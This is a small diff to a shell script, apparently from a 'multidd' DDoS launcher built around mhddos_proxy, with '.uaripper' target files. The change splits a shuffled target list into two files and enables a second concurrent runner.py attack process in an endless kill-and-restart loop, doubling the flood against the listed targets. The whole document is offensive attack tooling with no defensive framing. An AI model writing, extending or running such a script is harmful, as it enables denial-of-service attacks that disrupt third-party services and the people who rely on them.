@@ -74,7 +74,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/1 --additional-suffix=.uaripper $targets_uniq
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -215,8 +215,8 @@ fi
 while true; do
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
